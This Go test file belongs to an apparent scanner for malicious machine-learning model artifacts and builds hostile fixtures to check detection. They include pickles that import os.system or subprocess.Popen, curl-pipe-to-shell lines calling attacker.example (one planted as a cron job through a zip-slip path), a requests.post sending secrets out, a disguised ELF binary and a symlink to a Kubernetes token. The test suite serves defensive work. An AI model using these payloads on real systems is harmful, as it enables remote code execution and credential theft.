package inspector

import (
	"archive/zip"
	"encoding/binary"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func write(t *testing.T, dir, name string, data []byte) string {
	t.Helper()
	path := filepath.Join(dir, name)
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, data, 0o644); err != nil {
		t.Fatal(err)
	}
	return path
}

func inspect(t *testing.T, dir string) *Report {
	t.Helper()
	report, err := Inspect(dir, DefaultLimits())
	if err != nil {
		t.Fatalf("Inspect: %v", err)
	}
	return report
}

func findingIDs(report *Report) []string {
	ids := make([]string, 0, len(report.Findings))
	for _, f := range report.Findings {
		ids = append(ids, f.ID)
	}
	return ids
}

func hasID(report *Report, id string) bool {
	for _, f := range report.Findings {
		if f.ID == id {
			return true
		}
	}
	return false
}

// pickleWithGlobal builds a protocol-2 pickle whose GLOBAL opcode imports
// module.attr — the canonical shape of a malicious model payload.
func pickleWithGlobal(module, attr string) []byte {
	var buf []byte
	buf = append(buf, 0x80, 0x02)                       // PROTO 2
	buf = append(buf, 'c')                              // GLOBAL
	buf = append(buf, []byte(module+"\n"+attr+"\n")...) // module\nattr\n
	buf = append(buf, '(')                              // MARK
	buf = append(buf, 'R')                              // REDUCE
	buf = append(buf, '.')                              // STOP
	return buf
}

func TestDetectsPickleRCEPayload(t *testing.T) {
	dir := t.TempDir()
	write(t, dir, "weights.pkl", pickleWithGlobal("os", "system"))

	report := inspect(t, dir)

	if !hasID(report, "ASSAY-PICKLE-001") {
		t.Fatalf("did not flag os.system in pickle; findings: %v", findingIDs(report))
	}
	for _, f := range report.Findings {
		if f.ID == "ASSAY-PICKLE-001" && f.Severity != "Critical" {
			t.Errorf("severity = %q, want Critical for pickle RCE", f.Severity)
		}
	}
}

func TestDetectsSubprocessInPickle(t *testing.T) {
	dir := t.TempDir()
	write(t, dir, "model.bin", pickleWithGlobal("subprocess", "Popen"))

	if report := inspect(t, dir); !hasID(report, "ASSAY-PICKLE-001") {
		t.Fatalf("did not flag subprocess.Popen; findings: %v", findingIDs(report))
	}
}

// A pickle with no known-dangerous import is still unsafe, because the format
// itself executes code. It should be flagged, at lower severity.
func TestBenignPickleStillFlagged(t *testing.T) {
	dir := t.TempDir()
	write(t, dir, "scaler.pkl", []byte{0x80, 0x02, '}', 'q', 0x00, '.'})

	report := inspect(t, dir)

	if len(report.Findings) == 0 {
		t.Fatal("a pickle file produced no findings at all")
	}
	if hasID(report, "ASSAY-PICKLE-001") {
		t.Error("flagged a benign pickle as containing a dangerous import")
	}
}

func TestDetectsTrustRemoteCode(t *testing.T) {
	dir := t.TempDir()
	config, _ := json.Marshal(map[string]any{
		"architectures":     []string{"LlamaForCausalLM"},
		"trust_remote_code": true,
	})
	write(t, dir, "config.json", config)

	report := inspect(t, dir)

	if !hasID(report, "ASSAY-HF-001") {
		t.Fatalf("did not flag trust_remote_code; findings: %v", findingIDs(report))
	}
}

func TestTrustRemoteCodeFalseIsNotFlagged(t *testing.T) {
	dir := t.TempDir()
	config, _ := json.Marshal(map[string]any{"trust_remote_code": false})
	write(t, dir, "config.json", config)

	if report := inspect(t, dir); hasID(report, "ASSAY-HF-001") {
		t.Error("flagged trust_remote_code: false as dangerous")
	}
}

func TestDetectsAutoMap(t *testing.T) {
	dir := t.TempDir()
	config, _ := json.Marshal(map[string]any{
		"auto_map": map[string]string{"AutoModel": "modeling_custom.CustomModel"},
	})
	write(t, dir, "config.json", config)

	if report := inspect(t, dir); !hasID(report, "ASSAY-HF-002") {
		t.Fatalf("did not flag auto_map; findings: %v", findingIDs(report))
	}
}

func TestDetectsDangerousPythonInModelRepo(t *testing.T) {
	dir := t.TempDir()
	write(t, dir, "modeling_custom.py", []byte(`
import os
def load():
    os.system("curl http://attacker.example/x | sh")
`))

	report := inspect(t, dir)

	if !hasID(report, "ASSAY-PY-001") {
		t.Fatalf("did not flag os.system in model code; findings: %v", findingIDs(report))
	}
}

func TestDetectsNetworkEgressInPython(t *testing.T) {
	dir := t.TempDir()
	write(t, dir, "utils.py", []byte("import requests\nrequests.post('http://x/y', data=secrets)\n"))

	if report := inspect(t, dir); !hasID(report, "ASSAY-PY-003") {
		t.Fatalf("did not flag network egress; findings: %v", findingIDs(report))
	}
}

func TestDetectsZipSlip(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "model.zip")

	f, err := os.Create(path)
	if err != nil {
		t.Fatal(err)
	}
	zw := zip.NewWriter(f)
	w, err := zw.Create("../../etc/cron.d/payload")
	if err != nil {
		t.Fatal(err)
	}
	w.Write([]byte("* * * * * root curl http://attacker.example/x | sh\n"))
	zw.Close()
	f.Close()

	report := inspect(t, dir)

	if !hasID(report, "ASSAY-ARCHIVE-003") {
		t.Fatalf("did not flag zip slip; findings: %v", findingIDs(report))
	}
}

func TestDetectsPickleNestedInTorchArchive(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "model.pt")

	f, err := os.Create(path)
	if err != nil {
		t.Fatal(err)
	}
	zw := zip.NewWriter(f)
	w, err := zw.Create("archive/data.pkl")
	if err != nil {
		t.Fatal(err)
	}
	w.Write(pickleWithGlobal("os", "system"))
	zw.Close()
	f.Close()

	report := inspect(t, dir)

	if !hasID(report, "ASSAY-PICKLE-001") {
		t.Fatalf("did not find the pickle payload inside the torch archive; findings: %v", findingIDs(report))
	}
	if !hasID(report, "ASSAY-PICKLE-002") {
		t.Errorf("did not note the torch zip container; findings: %v", findingIDs(report))
	}
}

func TestDetectsELFBinaryHiddenAsData(t *testing.T) {
	dir := t.TempDir()
	// An ELF header behind an innocuous extension: renaming is the standard
	// evasion against extension-based scanning.
	write(t, dir, "vocab.txt.dat", append([]byte{0x7f, 'E', 'L', 'F', 2, 1, 1, 0}, make([]byte, 64)...))

	if report := inspect(t, dir); !hasID(report, "ASSAY-BIN-001") {
		t.Fatalf("did not flag the hidden ELF binary; findings: %v", findingIDs(report))
	}
}

func TestDetectsSharedLibrary(t *testing.T) {
	dir := t.TempDir()
	write(t, dir, "custom_op.so", []byte{0x7f, 'E', 'L', 'F'})

	if report := inspect(t, dir); !hasID(report, "ASSAY-NATIVE-001") {
		t.Fatalf("did not flag the shared library; findings: %v", findingIDs(report))
	}
}

func TestValidSafetensorsIsClean(t *testing.T) {
	dir := t.TempDir()

	header := []byte(`{"__metadata__":{"format":"pt"}}`)
	buf := make([]byte, 8)
	binary.LittleEndian.PutUint64(buf, uint64(len(header)))
	write(t, dir, "model.safetensors", append(buf, header...))

	report := inspect(t, dir)

	if len(report.Findings) != 0 {
		t.Fatalf("valid safetensors produced findings: %v", report.Findings)
	}
	if len(report.Formats) != 1 || report.Formats[0] != "safetensors" {
		t.Errorf("formats = %v, want [safetensors]", report.Formats)
	}
}

func TestSafetensorsWithLyingHeaderLength(t *testing.T) {
	dir := t.TempDir()

	buf := make([]byte, 8)
	binary.LittleEndian.PutUint64(buf, 1<<40) // header claims 1 TiB
	write(t, dir, "model.safetensors", append(buf, []byte("{}")...))

	if report := inspect(t, dir); !hasID(report, "ASSAY-ST-002") {
		t.Fatalf("did not flag the impossible header length; findings: %v", findingIDs(report))
	}
}

func TestDetectsSuspiciousONNXOperator(t *testing.T) {
	dir := t.TempDir()
	write(t, dir, "model.onnx", []byte("\x08\x07\x12\x04test com.microsoft.PythonOp trailing"))

	if report := inspect(t, dir); !hasID(report, "ASSAY-ONNX-001") {
		t.Fatalf("did not flag PythonOp; findings: %v", findingIDs(report))
	}
}

func TestReportsExecutableBit(t *testing.T) {
	dir := t.TempDir()
	path := write(t, dir, "run.dat", []byte("data"))
	if err := os.Chmod(path, 0o755); err != nil {
		t.Fatal(err)
	}

	if report := inspect(t, dir); !hasID(report, "ASSAY-EXEC-001") {
		t.Fatalf("did not flag the executable bit; findings: %v", findingIDs(report))
	}
}

func TestSymlinkEscapingArtifactIsFlagged(t *testing.T) {
	dir := t.TempDir()
	if err := os.Symlink("/var/run/secrets/kubernetes.io/serviceaccount/token", filepath.Join(dir, "weights.bin")); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}

	report := inspect(t, dir)

	if !hasID(report, "ASSAY-LINK-001") {
		t.Fatalf("did not flag the escaping symlink; findings: %v", findingIDs(report))
	}
}

func TestInternalSymlinkIsAllowed(t *testing.T) {
	dir := t.TempDir()
	write(t, dir, "real.safetensors", []byte("x"))
	if err := os.Symlink(filepath.Join(dir, "real.safetensors"), filepath.Join(dir, "alias.safetensors")); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}

	if report := inspect(t, dir); hasID(report, "ASSAY-LINK-001") {
		t.Error("flagged a symlink that stays inside the artifact")
	}
}

func TestCleanSafetensorsRepoProducesNoFindings(t *testing.T) {
	dir := t.TempDir()

	header := []byte(`{"__metadata__":{"format":"pt"}}`)
	buf := make([]byte, 8)
	binary.LittleEndian.PutUint64(buf, uint64(len(header)))
	write(t, dir, "model.safetensors", append(buf, header...))

	config, _ := json.Marshal(map[string]any{"model_type": "llama", "hidden_size": 4096})
	write(t, dir, "config.json", config)
	write(t, dir, "tokenizer.json", []byte(`{"version":"1.0","model":{"type":"BPE"}}`))
	write(t, dir, "README.md", []byte("# A model\n"))

	report := inspect(t, dir)

	if len(report.Findings) != 0 {
		t.Fatalf("clean safetensors repo produced false positives: %v", report.Findings)
	}
	if report.FilesScanned != 4 {
		t.Errorf("scanned %d files, want 4", report.FilesScanned)
	}
}

func TestUnreadableFileDoesNotAbortScan(t *testing.T) {
	dir := t.TempDir()
	write(t, dir, "a.safetensors", []byte("x"))
	write(t, dir, "nested/b.pkl", pickleWithGlobal("os", "system"))

	report := inspect(t, dir)

	if !hasID(report, "ASSAY-PICKLE-001") {
		t.Errorf("did not reach the nested pickle; findings: %v", findingIDs(report))
	}
}

func TestFindingsCarryLocation(t *testing.T) {
	dir := t.TempDir()
	write(t, dir, "nested/deep/evil.pkl", pickleWithGlobal("os", "system"))

	report := inspect(t, dir)

	for _, f := range report.Findings {
		if f.ID != "ASSAY-PICKLE-001" {
			continue
		}
		if !strings.Contains(f.Location, "nested/deep/evil.pkl") {
			t.Errorf("location = %q, want it to name the offending file", f.Location)
		}
		return
	}
	t.Fatal("no pickle finding produced")
}
